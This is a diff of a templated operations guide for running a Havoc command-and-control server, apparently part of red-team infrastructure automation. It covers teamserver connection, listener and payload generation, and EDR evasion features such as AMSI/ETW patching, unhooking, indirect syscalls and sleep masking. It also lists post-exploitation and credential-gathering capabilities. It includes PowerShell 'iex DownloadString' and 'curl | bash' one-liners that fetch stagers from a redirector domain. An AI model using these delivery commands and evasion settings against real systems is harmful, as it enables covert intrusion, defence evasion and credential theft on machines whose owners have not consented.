@@ -1,54 +1,60 @@
 HAVOC C2 OPERATIONS GUIDE
 ==========================
 
-This guide provides information on using the Havoc C2 framework deployed on
-your infrastructure.
+This guide provides information on using the Havoc C2 framework (dev branch) 
+deployed on your infrastructure.
 
 SERVER INFORMATION
 -----------------
 C2 Server IP: {{ c2_ip }}
 Redirector Domain: {{ redirector_domain }}
-Teamserver Port: 40056
-Admin Password: Stored in /opt/havoc/data/profiles/default.yaotl
+Teamserver Port: {{ havoc_teamserver_port | default(40056) }}
+HTTP Listener Port: {{ havoc_http_port | default(8080) }}
+HTTPS Listener Port: {{ havoc_https_port | default(443) }}
+Admin User: {{ havoc_admin_user | default('admin') }}
+Admin Password: Stored in /root/Tools/havoc/data/profiles/default.yaotl
 
 CONNECTING TO THE TEAMSERVER
 ---------------------------
-From your local machine, you should:
+From your local machine:
 
-1. Make sure Havoc client is installed on your operator system
-2. Connect to the Teamserver:
+1. Make sure Havoc client (dev branch) is installed:
+   $ git clone -b dev https://github.com/HavocFramework/Havoc.git
+   $ cd Havoc/Client
+   $ mkdir build && cd build
+   $ cmake -GNinja ..
+   $ ninja
+
+2. Connect to the Teamserver via GUI:
    - Host: {{ c2_ip }}
-   - Port: 40056
-   - User: admin
-   - Password: See /opt/havoc/data/profiles/default.yaotl
+   - Port: {{ havoc_teamserver_port | default(40056) }}
+   - User: {{ havoc_admin_user | default('admin') }}
+   - Password: See /root/Tools/havoc/data/profiles/default.yaotl
 
-Note: You can use the team server CLI with:
-$ havoc-teamserver client --username admin --password Your_Password
+3. CLI Connection:
+   $ ./havoc client --address {{ c2_ip }}:{{ havoc_teamserver_port | default(40056) }} --username {{ havoc_admin_user | default('admin') }} --password [password]
 
 LISTENERS
 --------
 Two default listeners are configured:
-- HTTP on port 8080
-- HTTPS on port 443 (through the redirector)
+- HTTP on port {{ havoc_http_port | default(8080) }}
+- HTTPS on port {{ havoc_https_port | default(443) }} (through the redirector)
 
-You can view and manage listeners through the Havoc client.
+To view and manage listeners: Attack → Listeners in the Havoc client.
 
 GENERATING PAYLOADS
 -----------------
-Pre-generated payloads are available in:
-- /opt/havoc/payloads/
+Pre-generated payloads are available in /root/Tools/havoc/payloads/
 
-For new payloads:
-1. Connect to the Teamserver using the Havoc client
+To generate new payloads:
+1. Connect to the Teamserver
 2. Navigate to Attack → Payload
-3. Choose your payload options and generate
+3. Select the listener (HTTPS recommended)
+4. Choose architecture, format, and evasion options
+5. For enhanced evasion: Enable indirect syscalls, stack spoofing, and sleep mask
 
 PAYLOAD DELIVERY
 --------------
-Payloads can be delivered through:
-- HTTP server at {{ c2_ip }}:8443
-- Through the redirector at {{ redirector_domain }}
-
 PowerShell one-liner:
 powershell -exec bypass -c "iex(New-Object Net.WebClient).DownloadString('https://{{ redirector_domain }}/windows_stager.ps1')"
 
@@ -57,21 +63,50 @@ curl -s https://{{ redirector_domain }}/linux_stager.sh | bash
 
 OPERATIONAL SECURITY
 ------------------
-- All connections go through the redirector
-- Sleep times of agents are randomized (5s default with 30% jitter)
-- Havoc is configured with numerous EDR evasion features
-- Anti-forensics measures are enabled in all payloads
+- All connections are routed through the redirector
+- Payload customization includes:
+  * Sleep time: {{ havoc_sleep | default(5) }} seconds with {{ havoc_jitter | default(30) }}% jitter
+  * EDR unhooking techniques
+  * AMSI/ETW patching
+  * Indirect syscalls
+  * Sleep masking with technique: {{ havoc_sleep_mask_technique | default(0) }}
+
+ADVANCED FEATURES (DEV BRANCH)
+----------------------------
+- Enhanced memory scanner evasion
+- PPID spoofing capabilities
+- Reflective DLL loading improvements
+- EDR hook detection and avoidance
+- Process token manipulation
+- Registry persistence options
+
+POST-EXPLOITATION
+---------------
+For post-exploitation, Havoc offers:
+
+1. BOF (Beacon Object Files) support
+2. Integrated command & control modules
+3. File system operations
+4. Process injection & manipulation
+5. Credential gathering capabilities
+
+SERVER MANAGEMENT
+---------------
+- Havoc Teamserver service: systemctl status havoc
+- Service configuration: /etc/systemd/system/havoc.service
+- Configuration profiles: /root/Tools/havoc/data/profiles/
 
 TROUBLESHOOTING
 --------------
-1. If agents can't connect:
+1. Agent connection issues:
    - Verify DNS for {{ redirector_domain }} points to your redirector
-   - Check NGINX configuration on the redirector
-   - Ensure ports 8080 and 443 are open on respective servers
+   - Check nginx configuration on the redirector
+   - Confirm ports {{ havoc_http_port | default(8080) }} and {{ havoc_https_port | default(443) }} are open
 
-2. If Havoc Teamserver isn't responding:
-   - Check service status: systemctl status havoc
+2. Teamserver issues:
+   - Check service: systemctl status havoc
    - View logs: journalctl -u havoc
    - Restart if needed: systemctl restart havoc
 
-3. Use the health command in Havoc client to check Teamserver health
+3. Use Havoc client CLI debugging:
+   ./havoc client --address {{ c2_ip }}:{{ havoc_teamserver_port | default(40056) }} --username {{ havoc_admin_user | default('admin') }} --password [password] --debug
